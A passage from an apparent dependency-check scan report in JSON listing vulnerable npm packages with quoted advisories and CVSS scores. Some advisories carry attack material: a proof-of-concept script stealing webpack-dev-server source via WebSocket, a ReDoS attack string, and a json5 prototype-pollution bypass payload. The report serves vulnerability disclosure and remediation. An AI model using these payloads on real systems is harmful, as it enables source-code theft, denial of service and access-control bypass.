Download [reproduction.zip](https:\/\/github.com\/user-attachments\/files\/18418233\/reproduction.zip) and extract it\n2. Run `npm i`\n3. Run `npx webpack-dev-server`\n4. Open `http:\/\/{ipaddress}\/?target=http:\/\/localhost:8080&file=main` with a non-Chromium browser (I used Firefox 134.0.1)\n5. Edit `src\/index.js` in the extracted directory\n6. You can see the content of `src\/index.js`\n\n![image](https:\/\/github.com\/user-attachments\/assets\/7ce3cad7-1a4d-4778-baae-1adae5e93ba4)\n\nThe script in the POC site is:\n```js\nwindow.webpackHotUpdate = (...args) => {\n    console.log(...args);\n    for (i in args[1]) {\n        document.body.innerText = args[1][i].toString() + document.body.innerText\n\t    console.log(args[1][i])\n    }\n}\n\nlet params = new URLSearchParams(window.location.search);\nlet target = new URL(params.get('target') || 'http:\/\/127.0.0.1:8080');\nlet file = params.get('file')\nlet wsProtocol = target.protocol === 'http:' ? 'ws' : 'wss';\nlet wsPort = target.port;\nvar currentHash = '';\nvar currentHash2 = '';\nlet wsTarget = `${wsProtocol}:\/\/${target.hostname}:${wsPort}\/ws`;\nws = new WebSocket(wsTarget);\nws.onmessage = event => {\n    console.log(event.data);\n    if (event.data.match('\"type\":\"ok\"')) {\n        s = document.createElement('script');\n        s.src = `${target}${file}.${currentHash2}.hot-update.js`;\n        document.body.appendChild(s)\n    }\n    r = event.data.match(\/\"([0-9a-f]{20})\"\/);\n    if (r !== null) {\n        currentHash2 = currentHash;\n        currentHash = r[1];\n        console.log(currentHash, currentHash2);\n    }\n}\n```\n\n### Impact\nThis vulnerability can result in the source code to be stolen for users that uses a predictable port and uses a non-Chromium based browser."},"help": {"text": "","markdown": "For more information see [GHSA-9jgg-88mc-972h](https://github.com/advisories/GHSA-9jgg-88mc-972h)\n\n\nIf this is a false positive - consider using the HTML report to generate a suppression file. For more information see [How dependency-check works](https://dependency-check.github.io/DependencyCheck/general/internals.html),[How to read the HTML report](https://dependency-check.github.io/DependencyCheck/general/thereport.html), and[Suppressing false positives](https://dependency-check.github.io/DependencyCheck/general/suppression.html)."},"properties": {"cvssv3_baseScore": 6.5,"security-severity": "6.5","cvssv3_attackVector": "NETWORK","cvssv3_attackComplexity": "LOW","cvssv3_privilegesRequired": "NONE","cvssv3_userInteraction": "REQUIRED","cvssv3_scope": "UNCHANGED","cvssv3_confidentialityImpact": "HIGH","cvssv3_integrityImpact": "NONE","cvssv3_availabilityImpact": "NONE","cvssv3_baseSeverity": "MEDIUM","cvssv3_version": "_3_1","source": "NPM"}},{"id": "GHSA-rhx6-c78j-4q9w","shortDescription": {"text": "high severity - GHSA-rhx6-c78j-4q9w Inefficient Regular Expression Complexity vulnerability in pkg:npm\/path-to-regexp@0.1.7"},"fullDescription": {"text": "### Impact\n\nThe regular expression that is vulnerable to backtracking can be generated in versions before 0.1.12 of `path-to-regexp`, originally reported in CVE-2024-45296\n\n### Patches\n\nUpgrade to 0.1.12.\n\n### Workarounds\n\nAvoid using two parameters within a single path segment, when the separator is not `.` (e.g. no `\/:a-:b`). Alternatively, you can define the regex used for both parameters and ensure they do not overlap to allow backtracking.\n\n### References\n\n- https:\/\/github.com\/advisories\/GHSA-9wv6-86v2-598j\n- https:\/\/blakeembrey.com\/posts\/2024-09-web-redos\/"},"help": {"text": "","markdown": "For more information see [GHSA-rhx6-c78j-4q9w](https://github.com/advisories/GHSA-rhx6-c78j-4q9w)\n\n\nIf this is a false positive - consider using the HTML report to generate a suppression file. For more information see [How dependency-check works](https://dependency-check.github.io/DependencyCheck/general/internals.html),[How to read the HTML report](https://dependency-check.github.io/DependencyCheck/general/thereport.html), and[Suppressing false positives](https://dependency-check.github.io/DependencyCheck/general/suppression.html)."},"properties": {"cvssv3_baseScore": 7.5,"security-severity": "7.5","cvssv3_attackVector": "NETWORK","cvssv3_attackComplexity": "LOW","cvssv3_privilegesRequired": "NONE","cvssv3_userInteraction": "NONE","cvssv3_scope": "UNCHANGED","cvssv3_confidentialityImpact": "NONE","cvssv3_integrityImpact": "NONE","cvssv3_availabilityImpact": "HIGH","cvssv3_baseSeverity": "HIGH","cvssv3_version": "_3_1","source": "NPM"}},{"id": "CVE-2024-4067","shortDescription": {"text": "medium severity - CVE-2024-4067 Inefficient Regular Expression Complexity vulnerability in pkg:npm\/micromatch@4.0.4"},"fullDescription": {"text": "The NPM package `micromatch` prior to 4.0.8 is vulnerable to Regular Expression Denial of Service (ReDoS). The vulnerability occurs in `micromatch.braces()` in `index.js` because the pattern `.*` will greedily match anything. By passing a malicious payload, the pattern matching will keep backtracking to the input while it doesn't find the closing bracket. As the input size increases, the consumption time will also increase until it causes the application to hang or slow down. There was a merged fix but further testing shows the issue persists. This issue should be mitigated by using a safe pattern that won't start backtracking the regular expression due to greedy matching. This issue was fixed in version 4.0.8."},"help": {"text": "","markdown": "\n\nIf this is a false positive - consider using the HTML report to generate a suppression file. For more information see [How dependency-check works](https://dependency-check.github.io/DependencyCheck/general/internals.html),[How to read the HTML report](https://dependency-check.github.io/DependencyCheck/general/thereport.html), and[Suppressing false positives](https://dependency-check.github.io/DependencyCheck/general/suppression.html)."},"properties": {"cvssv3_baseScore": 5.300000190734863,"security-severity": "5.300000190734863","cvssv3_attackVector": "NETWORK","cvssv3_attackComplexity": "LOW","cvssv3_privilegesRequired": "NONE","cvssv3_userInteraction": "NONE","cvssv3_scope": "UNCHANGED","cvssv3_confidentialityImpact": "NONE","cvssv3_integrityImpact": "NONE","cvssv3_availabilityImpact": "LOW","cvssv3_baseSeverity": "MEDIUM","cvssv3_version": "_3_1","source": "OSSINDEX"}},{"id": "CVE-2024-4068","shortDescription": {"text": "high severity - CVE-2024-4068 Excessive Platform Resource Consumption within a Loop vulnerability in pkg:npm\/braces@3.0.2"},"fullDescription": {"text": "The NPM package `braces`, versions prior to 3.0.3, fails to limit the number of characters it can handle, which could lead to Memory Exhaustion. In `lib\/parse.js,` if a malicious user sends \"imbalanced braces\" as input, the parsing will enter a loop, which will cause the program to start allocating heap memory without freeing it at any moment of the loop. Eventually, the JavaScript heap limit is reached, and the program will crash."},"help": {"text": "","markdown": "\n\nIf this is a false positive - consider using the HTML report to generate a suppression file. For more information see [How dependency-check works](https://dependency-check.github.io/DependencyCheck/general/internals.html),[How to read the HTML report](https://dependency-check.github.io/DependencyCheck/general/thereport.html), and[Suppressing false positives](https://dependency-check.github.io/DependencyCheck/general/suppression.html)."},"properties": {"cvssv3_baseScore": 7.5,"security-severity": "7.5","cvssv3_attackVector": "NETWORK","cvssv3_attackComplexity": "LOW","cvssv3_privilegesRequired": "NONE","cvssv3_userInteraction": "NONE","cvssv3_scope": "UNCHANGED","cvssv3_confidentialityImpact": "NONE","cvssv3_integrityImpact": "NONE","cvssv3_availabilityImpact": "HIGH","cvssv3_baseSeverity": "HIGH","cvssv3_version": "_3_1","source": "OSSINDEX"}},{"id": "CVE-2023-42282","shortDescription": {"text": "critical severity - CVE-2023-42282 Server-Side Request Forgery (SSRF) vulnerability in pkg:npm\/ip@1.1.5"},"fullDescription": {"text": "The ip package before 1.1.9 for Node.js might allow SSRF because some IP addresses (such as 0x7f.1) are improperly categorized as globally routable via isPublic."},"help": {"text": "","markdown": "\n\nIf this is a false positive - consider using the HTML report to generate a suppression file. For more information see [How dependency-check works](https://dependency-check.github.io/DependencyCheck/general/internals.html),[How to read the HTML report](https://dependency-check.github.io/DependencyCheck/general/thereport.html), and[Suppressing false positives](https://dependency-check.github.io/DependencyCheck/general/suppression.html)."},"properties": {"cvssv3_baseScore": 9.800000190734863,"security-severity": "9.800000190734863","cvssv3_attackVector": "NETWORK","cvssv3_attackComplexity": "LOW","cvssv3_privilegesRequired": "NONE","cvssv3_userInteraction": "NONE","cvssv3_scope": "UNCHANGED","cvssv3_confidentialityImpact": "HIGH","cvssv3_integrityImpact": "HIGH","cvssv3_availabilityImpact": "HIGH","cvssv3_baseSeverity": "CRITICAL","cvssv3_version": "_3_1","source": "OSSINDEX"}},{"id": "CVE-2023-28154","shortDescription": {"text": "critical severity - CVE-2023-28154 vulnerability in pkg:npm\/webpack@5.67.0"},"fullDescription": {"text": "Webpack 5 before 5.76.0 does not avoid cross-realm object access. ImportParserPlugin.js mishandles the magic comment feature. An attacker who controls a property of an untrusted object can obtain access to the real global object.\n\nSonatype's research suggests that this CVE's details differ from those defined at NVD. See https:\/\/ossindex.sonatype.org\/vulnerability\/CVE-2023-28154 for details"},"help": {"text": "","markdown": "\n\nIf this is a false positive - consider using the HTML report to generate a suppression file. For more information see [How dependency-check works](https://dependency-check.github.io/DependencyCheck/general/internals.html),[How to read the HTML report](https://dependency-check.github.io/DependencyCheck/general/thereport.html), and[Suppressing false positives](https://dependency-check.github.io/DependencyCheck/general/suppression.html)."},"properties": {"cvssv3_baseScore": 9.800000190734863,"security-severity": "9.800000190734863","cvssv3_attackVector": "NETWORK","cvssv3_attackComplexity": "LOW","cvssv3_privilegesRequired": "NONE","cvssv3_userInteraction": "NONE","cvssv3_scope": "UNCHANGED","cvssv3_confidentialityImpact": "HIGH","cvssv3_integrityImpact": "HIGH","cvssv3_availabilityImpact": "HIGH","cvssv3_baseSeverity": "CRITICAL","cvssv3_version": "_3_1","source": "OSSINDEX"}},{"id": "GHSA-mwcw-c2x4-8c55","shortDescription": {"text": "medium severity - GHSA-mwcw-c2x4-8c55 Loop with Unreachable Exit Condition ('Infinite Loop') vulnerability in pkg:npm\/nanoid@3.3.1"},"fullDescription": {"text": "When nanoid is called with a fractional value, there were a number of undesirable effects:\n\n1. in browser and non-secure, the code infinite loops on while (size--)\n2. in node, the value of poolOffset becomes fractional, causing calls to nanoid to return zeroes until the pool is next filled\n3. if the first call in node is a fractional argument, the initial buffer allocation fails with an error\n\nVersion 3.3.8 and 5.0.9 are fixed."},"help": {"text": "","markdown": "For more information see [GHSA-mwcw-c2x4-8c55](https://github.com/advisories/GHSA-mwcw-c2x4-8c55)\n\n\nIf this is a false positive - consider using the HTML report to generate a suppression file. For more information see [How dependency-check works](https://dependency-check.github.io/DependencyCheck/general/internals.html),[How to read the HTML report](https://dependency-check.github.io/DependencyCheck/general/thereport.html), and[Suppressing false positives](https://dependency-check.github.io/DependencyCheck/general/suppression.html)."},"properties": {"cvssv3_baseScore": 4.300000190734863,"security-severity": "4.300000190734863","cvssv3_attackVector": "NETWORK","cvssv3_attackComplexity": "LOW","cvssv3_privilegesRequired": "LOW","cvssv3_userInteraction": "NONE","cvssv3_scope": "UNCHANGED","cvssv3_confidentialityImpact": "NONE","cvssv3_integrityImpact": "LOW","cvssv3_availabilityImpact": "NONE","cvssv3_baseSeverity": "MEDIUM","cvssv3_version": "_3_1","source": "NPM"}},{"id": "GHSA-9wv6-86v2-598j","shortDescription": {"text": "high severity - GHSA-9wv6-86v2-598j Inefficient Regular Expression Complexity vulnerability in pkg:npm\/path-to-regexp@0.1.7"},"fullDescription": {"text": "### Impact\n\nA bad regular expression is generated any time you have two parameters within a single segment, separated by something that is not a period (`.`). For example, `\/:a-:b`.\n\n### Patches\n\nFor users of 0.1, upgrade to `0.1.10`. All other users should upgrade to `8.0.0`.\n\nThese versions add backtrack protection when a custom regex pattern is not provided:\n\n- [0.1.10](https:\/\/github.com\/pillarjs\/path-to-regexp\/releases\/tag\/v0.1.10)\n- [1.9.0](https:\/\/github.com\/pillarjs\/path-to-regexp\/releases\/tag\/v1.9.0)\n- [3.3.0](https:\/\/github.com\/pillarjs\/path-to-regexp\/releases\/tag\/v3.3.0)\n- [6.3.0](https:\/\/github.com\/pillarjs\/path-to-regexp\/releases\/tag\/v6.3.0)\n\nThey do not protect against vulnerable user supplied capture groups. Protecting against explicit user patterns is out of scope for old versions and not considered a vulnerability.\n\nVersion [7.1.0](https:\/\/github.com\/pillarjs\/path-to-regexp\/releases\/tag\/v7.1.0) can enable `strict: true` and get an error when the regular expression might be bad.\n\nVersion [8.0.0](https:\/\/github.com\/pillarjs\/path-to-regexp\/releases\/tag\/v8.0.0) removes the features that can cause a ReDoS.\n\n### Workarounds\n\nAll versions can be patched by providing a custom regular expression for parameters after the first in a single segment. As long as the custom regular expression does not match the text before the parameter, you will be safe. For example, change `\/:a-:b` to `\/:a-:b([^-\/]+)`.\n\nIf paths cannot be rewritten and versions cannot be upgraded, another alternative is to limit the URL length. For example, halving the attack string improves performance by 4x faster.\n\n### Details\n\nUsing `\/:a-:b` will produce the regular expression `\/^\\\/([^\\\/]+?)-([^\\\/]+?)\\\/?$\/`. This can be exploited by a path such as `\/a${'-a'.repeat(8_000)}\/a`. [OWASP](https:\/\/owasp.org\/www-community\/attacks\/Regular_expression_Denial_of_Service_-_ReDoS) has a good example of why this occurs, but the TL;DR is the `\/a` at the end ensures this route would never match but due to naive backtracking it will still attempt every combination of the `:a-:b` on the repeated 8,000 `-a`.\n\nBecause JavaScript is single threaded and regex matching runs on the main thread, poor performance will block the event loop and can lead to a DoS. In local benchmarks, exploiting the unsafe regex will result in performance that is over 1000x worse than the safe regex. In a more realistic environment using Express v4 and 10 concurrent connections, this translated to average latency of ~600ms vs 1ms.\n\n### References\n\n* [OWASP](https:\/\/owasp.org\/www-community\/attacks\/Regular_expression_Denial_of_Service_-_ReDoS)\n* [Detailed blog post](https:\/\/blakeembrey.com\/posts\/2024-09-web-redos\/)"},"help": {"text": "","markdown": "For more information see [GHSA-9wv6-86v2-598j](https://github.com/advisories/GHSA-9wv6-86v2-598j)\n\n\nIf this is a false positive - consider using the HTML report to generate a suppression file. For more information see [How dependency-check works](https://dependency-check.github.io/DependencyCheck/general/internals.html),[How to read the HTML report](https://dependency-check.github.io/DependencyCheck/general/thereport.html), and[Suppressing false positives](https://dependency-check.github.io/DependencyCheck/general/suppression.html)."},"properties": {"cvssv3_baseScore": 7.5,"security-severity": "7.5","cvssv3_attackVector": "NETWORK","cvssv3_attackComplexity": "LOW","cvssv3_privilegesRequired": "NONE","cvssv3_userInteraction": "NONE","cvssv3_scope": "UNCHANGED","cvssv3_confidentialityImpact": "NONE","cvssv3_integrityImpact": "NONE","cvssv3_availabilityImpact": "HIGH","cvssv3_baseSeverity": "HIGH","cvssv3_version": "_3_1","source": "NPM"}},{"id": "GHSA-9c47-m6qq-7p4h","shortDescription": {"text": "high severity - GHSA-9c47-m6qq-7p4h Improperly Controlled Modification of Object Prototype Attributes ('Prototype Pollution') vulnerability in pkg:npm\/json5@1.0.1"},"fullDescription": {"text": "The `parse` method of the JSON5 library before and including version `2.2.1` does not restrict parsing of keys named `__proto__`, allowing specially crafted strings to pollute the prototype of the resulting object.\n\nThis vulnerability pollutes the prototype of the object returned by `JSON5.parse` and not the global Object prototype, which is the commonly understood definition of Prototype Pollution. However, polluting the prototype of a single object can have significant security impact for an application if the object is later used in trusted operations.\n\n## Impact\nThis vulnerability could allow an attacker to set arbitrary and unexpected keys on the object returned from `JSON5.parse`. The actual impact will depend on how applications utilize the returned object and how they filter unwanted keys, but could include denial of service, cross-site scripting, elevation of privilege, and in extreme cases, remote code execution.\n\n## Mitigation\nThis vulnerability is patched in json5 v2.2.2 and later. A patch has also been backported for json5 v1 in versions v1.0.2 and later.\n\n## Details\n \nSuppose a developer wants to allow users and admins to perform some risky operation, but they want to restrict what non-admins can do. To accomplish this, they accept a JSON blob from the user, parse it using `JSON5.parse`, confirm that the provided data does not set some sensitive keys, and then performs the risky operation using the validated data:\n \n```js\nconst JSON5 = require('json5');\n\nconst doSomethingDangerous = (props) => {\n  if (props.isAdmin) {\n    console.log('Doing dangerous thing as admin.');\n  } else {\n    console.log('Doing dangerous thing as user.');\n  }\n};\n\nconst secCheckKeysSet = (obj, searchKeys) => {\n  let searchKeyFound = false;\n  Object.keys(obj).forEach((key) => {\n    if (searchKeys.indexOf(key) > -1) {\n      searchKeyFound = true;\n    }\n  });\n  return searchKeyFound;\n};\n\nconst props = JSON5.parse('{\"foo\": \"bar\"}');\nif (!secCheckKeysSet(props, ['isAdmin', 'isMod'])) {\n  doSomethingDangerous(props); \/\/ \"Doing dangerous thing as user.\"\n} else {\n  throw new Error('Forbidden...');\n}\n```\n \nIf the user attempts to set the `isAdmin` key, their request will be rejected:\n \n```js\nconst props = JSON5.parse('{\"foo\": \"bar\", \"isAdmin\": true}');\nif (!secCheckKeysSet(props, ['isAdmin', 'isMod'])) {\n  doSomethingDangerous(props);\n} else {\n  throw new Error('Forbidden...'); \/\/ Error: Forbidden...\n}\n```\n \nHowever, users can instead set the `__proto__` key to `{\"isAdmin\": true}`. `JSON5` will parse this key and will set the `isAdmin` key on the prototype of the returned object, allowing the user to bypass the security check and run their request as an admin:\n \n```js\nconst props = JSON5.parse('{\"foo\": \"bar\", \"__proto__\": {\"isAdmin\": true}}');\nif (!secCheckKeysSet(props, ['isAdmin', 'isMod'])) {\n  doSomethingDangerous(props); \/\/ \"Doing dangerous thing as admin.\"\n} else {\n  throw new Error('Forbidden...');\n}\n ```"},"help": {"text": "","markdown": "For more information see [GHSA-9c47-m6qq-7p4h](https://github.com/advisories/GHSA-9c47-m6qq-7p4h)\n\n\nIf this is a false positive - consider using the HTML report to generate a suppression file. For more information see [How dependency-check works](https://dependency-check.github.io/DependencyCheck/general/internals.html),[How to read the HTML report](https://dependency-check.github.io/DependencyCheck/general/thereport.html), and[Suppressing false positives](https://dependency-check.github.io/DependencyCheck/general/suppression.html)."},"properties": {"cvssv3_baseScore": 7.099999904632568,"security-severity": "7.099999904632568","cvssv3_attackVector": "NETWORK","cvssv3_attackComplexity": "HIGH","cvssv3_privilegesRequired": "LOW","cvssv3_userInteraction": "NONE","cvssv3_scope": "UNCHANGED","cvssv3_confidentialityImpact": "HIGH","cvssv3_integrityImpact": "LOW","cvssv3_availabilityImpact": "HIGH","cvssv3_baseSeverity": "HIGH","cvssv3_version": "_3_1","source": "NPM"}},{"id": "GHSA-968p-4wvh-cqc8","shortDescription": {"text": "medium severity - GHSA-968p-4wvh-cqc8 Inefficient Regular Expression Complexity vulnerability in pkg:npm\/%40babel%2Fhelpers@7.17.2"},"fullDescription": {"text": "### Impact\n\nWhen using Babel to compile [regular expression named capturing groups](https:\/\/developer.mozilla.org\/en-US\/docs\/Web\/JavaScript\/Reference\/Regular_expressions\/Named_capturing_group), Babel will generate a polyfill for the `.replace` method that has quadratic complexity on some specific replacement pattern strings (i.e. the second argument passed to `.replace`).\n\nYour generated code is vulnerable if _all_ the following conditions are true:\n- You use Babel to compile [regular expression named capturing groups](https:\/\/developer.mozilla.org\/en-US\/docs\/Web\/JavaScript\/Reference\/Regular_expressions\/Named_capturing_group)\n- You use the `.replace` method on a regular expression that contains named capturing groups\n- **Your code uses untrusted strings as the second argument of `.replace`**\n\nIf you are using `@babel\/preset-env` with the [`targets`](https:\/\/babeljs.io\/docs\/options#targets) option, the transform that injects the vulnerable code is automatically enabled if:\n- you use [_duplicated_ named capturing groups](https:\/\/github.com\/tc39\/proposal-duplicate-named-capturing-groups), and target any browser older than Chrome\/Edge 126, Opera 112, Firefox 129, Safari 17.4, or Node.js 23\n- you use any [named capturing groups](https:\/\/developer.mozilla.org\/en-US\/docs\/Web\/JavaScript\/Reference\/Regular_expressions\/Named_capturing_group), and target any browser older than Chrome 64, Opera 71, Edge 79, Firefox 78, Safari 11.1, or Node.js 10\n\nYou can verify what transforms `@babel\/preset-env` is using by enabling the [`debug` option](https:\/\/babeljs.io\/docs\/babel-preset-env#debug).\n\n\n### Patches\n\nThis problem has been fixed in `@babel\/helpers` and `@babel\/runtime` 7.26.10 and 8.0.0-alpha.17, please upgrade. It's likely that you do not directly depend on `@babel\/helpers`, and instead you depend on `@babel\/core` (which itself depends on `@babel\/helpers`). Upgrading to `@babel\/core` 7.26.10 is not required, but it guarantees that you are on a new enough `@babel\/helpers` version.\n\nPlease note that just updating your Babel dependencies is not enough: you will also need to re-compile your code.\n\n### Workarounds\n\nIf you are passing user-provided strings as the second argument of `.replace` on regular expressions that contain named capturing groups, validate the input and make sure it does not contain the substring `$<` if it's then not followed by `>` (possibly with other characters in between).\n\n### References\n\nThis vulnerability was reported and fixed in https:\/\/github.com\/babel\/babel\/pull\/17173."},"help": {"text": "","markdown": "For more information see [GHSA-968p-4wvh-cqc8](https://github.com/advisories/GHSA-968p-4wvh-cqc8)\n\n\nIf this is a false positive - consider using the HTML report to generate a suppression file. For more information see [How dependency-check works](https://dependency-check.github.io/DependencyCheck/general/internals.html),[How to read the HTML report](https://dependency-check.github.io/DependencyCheck/general/thereport.html), and[Suppressing false positives](https://dependency-check.github.io/DependencyCheck/general/suppression.html)."},"properties": {"cvssv3_baseScore": 6.199999809265137,"security-severity": "6.199999809265137","cvssv3_attackVector": "LOCAL","cvssv3_attackComplexity": "LOW","cvssv3_privilegesRequired": "NONE","cvssv3_userInteraction": "NONE","cvssv3_scope": "UNCHANGED","cvssv3_confidentialityImpact": "NONE","cvssv3_integrityImpact": "NONE","cvssv3_availabilityImpact": "HIGH","cvssv3_baseSeverity": "MEDIUM","cvssv3_version": "_3_1","source": "NPM"}},{"id": "CVE-2025-54798","shortDescription": {"text": "low severity - CVE-2025-54798 Improper Link Resolution Before File Access ('Link Following') vulnerability in pkg:npm\/tmp@0.2.1"},"fullDescription": {"text": "tmp is a temporary file and directory creator for node.js. In versions 0.2.3 and below, tmp is vulnerable to an arbitrary temporary file \/ directory write via symbolic link dir parameter. This is fixed in version 0.2.4."},"help": {"text": "","markdown": "\n\nIf this is a false positive - consider using the HTML report to generate a suppression file. For more information see [How dependency-check works](https://dependency-check.github.io/DependencyCheck/general/internals.html),[How to read the HTML report](https://dependency-check.github.io/DependencyCheck/general/thereport.html), and[Suppressing false positives](https://dependency-check.github.io/DependencyCheck/general/suppression.html)."},"properties": {"cvssv3_baseScore": 2.5,"security-severity": "2.5","cvssv3_attackVector": "LOCAL","cvssv3_attackComplexity": "HIGH","cvssv3_privilegesRequired": "LOW","cvssv3_userInteraction": "NONE","cvssv3_scope": "UNCHANGED","cvssv3_confidentialityImpact": "NONE","cvssv3_integrityImpact": "LOW","cvssv3_availabilityImpact": "NONE","cvssv3_baseSeverity": "LOW","cvssv3_version": "_3_1","source": "OSSINDEX"}},{"id": "GHSA-25hc-qcg6-38wj","shortDescription": {"text": "medium severity - GHSA-25hc-qcg6-38wj Improper Check for Unusual or Exceptional Conditions vulnerability in pkg:npm\/socket.io@4.4.1"},"fullDescription": {"text": "### Impact\n\nA specially crafted Socket.IO packet can trigger an uncaught exception on the Socket.IO server, thus killing the Node.js process.\n\n```\nnode:events:502\n    throw err; \/\/ Unhandled 'error' event\n    ^\n\nError [ERR_UNHANDLED_ERROR]: Unhandled error. (undefined)\n    at new NodeError (node:internal\/errors:405:5)\n    at Socket.emit (node:events:500:17)\n    at \/myapp\/node_modules\/socket.io\/lib\/socket.js:531:14\n    at process.processTicksAndRejections (node:internal\/process\/task_queues:77:11) {\n  code: 'ERR_UNHANDLED_ERROR',\n  context: undefined\n}\n```\n\n### Affected versions\n\n| Version range    | Needs minor update?                            |\n|------------------|------------------------------------------------|\n| `4.6.2...latest` | Nothing to do               |\n| `3.0.0...4.6.1`  | Please upgrade to `socket.io@4.6.2` (at least) |\n| `2.3.0...2.5.0`  | Please upgrade to `socket.io@2.5.1`            |\n\n### Patches\n\nThis issue is fixed by https:\/\/github.com\/socketio\/socket.io\/commit\/15af22fc22bc6030fcead322c106f07640336115, included in `socket.io@4.6.2` (released in May 2023).\n\nThe fix was backported in the 2.x branch today: https:\/\/github.com\/socketio\/socket.io\/commit\/d30630ba10562bf987f4d2b42440fc41a828119c\n\n### Workarounds\n\nAs a workaround for the affected versions of the `socket.io` package, you can attach a listener for the \"error\" event:\n\n```js\nio.on(\"connection\", (socket) => {\n  socket.on(\"error\", () => {\n    \/\/ ...\n  });\n});\n```\n\n### For more information\n\nIf you have any questions or comments about this advisory:\n\n- Open a discussion [here](https:\/\/github.com\/socketio\/socket.io\/discussions)\n\nThanks a lot to [Paul Taylor](https:\/\/github.com\/Y0ursTruly) for the responsible disclosure.\n\n### References\n\n- https:\/\/github.com\/socketio\/socket.io\/commit\/15af22fc22bc6030fcead322c106f07640336115\n- https:\/\/github.com\/socketio\/socket.io\/commit\/d30630ba10562bf987f4d2b42440fc41a828119c\n"},"help": {"text": "","markdown": "For more information see [GHSA-25hc-qcg6-38wj](https://github.com/advisories/GHSA-25hc-qcg6-38wj)\n\n\nIf this is a false positive - consider using the HTML report to generate a suppression file. For more information see [How dependency-check works](https://dependency-check.github.io/DependencyCheck/general/internals.html),[How to read the HTML report](https://dependency-check.github.io/DependencyCheck/general/thereport.html), and[Suppressing false positives](https://dependency-check.github.io/DependencyCheck/general/suppression.html)."},"properties": {"cvssv3_baseScore": 7.300000190734863,"security-severity": "7.300000190734863","cvssv3_attackVector": "NETWORK","cvssv3_attackComplexity": "LOW","cvssv3_privilegesRequired": "NONE","cvssv3_userInteraction": "NONE","cvssv3_scope": "UNCHANGED","cvssv3_confidentialityImpact": "LOW","cvssv3_integrityImpact": "LOW","cvssv3_availabilityImpact": "LOW","cvssv3_baseSeverity": "HIGH","cvssv3_version": "_3_1","source": "NPM"}},{"id": "GHSA-hc6q-2mpp-qw7j","shortDescription": {"text": "critical severity - GHSA-hc6q-2mpp-qw7j vulnerability in pkg:npm\/webpack@5.67.0"},"fullDescription": {"text": "Webpack 5 before 5.76.0 does not avoid cross-realm object access. ImportParserPlugin.js mishandles the magic comment feature. An attacker who controls a property of an untrusted object can obtain access to the real global object."},"help": {"text": "","markdown": "For more information see [GHSA-hc6q-2mpp-qw7j](https://github.com/advisories/GHSA-hc6q-2mpp-qw7j)\n\n\nIf this is a false positive - consider using the HTML report to generate a suppression file. For more information see [How dependency-check works](https://dependency-check.github.io/DependencyCheck/general/internals.html),[How to read the HTML report](https://dependency-check.github.io/DependencyCheck/general/thereport.html), and[Suppressing false positives](https://dependency-check.github.io/DependencyCheck/general/suppression.html)."},"properties": {"cvssv3_baseScore": 9.800000190734863,"security-severity": "9.800000190734863","cvssv3_attackVector": "NETWORK","cvssv3_attackComplexity": "LOW","cvssv3_privilegesRequired": "NONE","cvssv3_userInteraction": "NONE","cvssv3_scope": "UNCHANGED","cvssv3_confidentialityImpact": "HIGH","cvssv3_integrityImpact": "HIGH","cvssv3_availabilityImpact": "HIGH","cvssv3_baseSeverity": "CRITICAL","cvssv3_version": "_3_1","source": "NPM"}},{"id": "CVE-2024-45590","shortDescription": {"text": "high severity - CVE-2024-45590 Asymmetric Resource Consumption (Amplification) vulnerability in pkg:npm\/body-parser@1.19.2"},"fullDescription": {"text": "body-parser is Node.js body parsing middleware. body-parser <1.20.3 is vulnerable to denial of service when url encoding is enabled. A malicious actor using a specially crafted payload could flood the server with a large number of requests, resulting in denial of service. This issue is patched in 1.20.3.\n\nSonatype's research suggests that this CVE's details differ from those defined at NVD. See https:\/\/ossindex.sonatype.org\/vulnerability\/CVE-2024-45590 for details"},"help": {"text": "","markdown": "\n\nIf this is a false positive - consider using the HTML report to generate a suppression file. For more information see [How dependency-check works](https://dependency-check.github.io/DependencyCheck/general/internals.html),[How to read the HTML report](https://dependency-check.github.io/DependencyCheck/general/thereport.html), and[Suppressing false positives](https://dependency-check.github.io/DependencyCheck/general/suppression.html)."},"properties": {"cvssv3_baseScore": 7.5,"security-severity": "7.5","cvssv3_attackVector": "NETWORK","cvssv3_attackComplexity": "LOW","cvssv3_privilegesRequired": "NONE","cvssv3_userInteraction": "NONE","cvssv3_scope": "UNCHANGED","cvssv3_confidentialityImpact": "NONE","cvssv3_integrityImpact": "NONE","cvssv3_availabilityImpact": "HIGH","cvssv3_baseSeverity": "HIGH","cvssv3_version": "_3_1","source": "OSSINDEX"}},{"id": "GHSA-jchw-25xp-jwwc","shortDescription": {"text": "medium severity - GHSA-jchw-25xp-jwwc URL Redirection to Untrusted Site ('Open Redirect') vulnerability in pkg:npm\/follow-redirects@1.14.9"},"fullDescription": {"text": "Versions of the package follow-redirects before 1.15.4 are vulnerable to Improper Input Validation due to the improper handling of URLs by the url.parse() function. When new URL() throws an error, it can be manipulated to misinterpret the hostname. An attacker could exploit this weakness to redirect traffic to a malicious site, potentially leading to information disclosure, phishing attacks, or other security breaches."},"help": {"text": "","markdown": "For more information see [GHSA-jchw-25xp-jwwc](https://github.com/advisories/GHSA-jchw-25xp-jwwc)\n\n\nIf this is a false positive - consider using the HTML report to generate a suppression file. For more information see [How dependency-check works](https://dependency-check.github.io/DependencyCheck/general/internals.html),[How to read the HTML report](https://dependency-check.github.io/DependencyCheck/general/thereport.html), and[Suppressing false positives](https://dependency-check.github.io/DependencyCheck/general/suppression.html)."},"properties": {"cvssv3_baseScore": 6.099999904632568,"security-severity": "6.099999904632568","cvssv3_attackVector": "NETWORK","cvssv3_attackComplexity": "LOW","cvssv3_privilegesRequired": "NONE","cvssv3_userInteraction": "REQUIRED","cvssv3_scope": "CHANGED","cvssv3_confidentialityImpact": "LOW","cvssv3_integrityImpact": "LOW","cvssv3_availabilityImpact": "NONE","cvssv3_baseSeverity": "MEDIUM","cvssv3_version": "_3_1","source": "NPM"}},{"id": "CVE-2024-28849","shortDescription": {"text": "medium severity - CVE-2024-28849 Exposure of Sensitive Information to an Unauthorized Actor vulnerability in pkg:npm\/follow-redirects@1.14.9"},"fullDescription": {"text": "follow-redirects is an open source, drop-in replacement for Node's `http` and `https` modules that automatically follows redirects. In affected versions follow-redirects only clears authorization header during cross-domain redirect, but keep the proxy-authentication header which contains credentials too. This vulnerability may lead to credentials leak, but has been addressed in version 1.15.6. Users are advised to upgrade. There are no known workarounds for this vulnerability.\n\nSonatype's research suggests that this CVE's details differ from those defined at NVD. See https:\/\/ossindex.sonatype.org\/vulnerability\/CVE-2024-28849 for details"},"help": {"text": "","markdown": "\n\nIf this is a false positive - consider using the HTML report to generate a suppression file. For more information see [How dependency-check 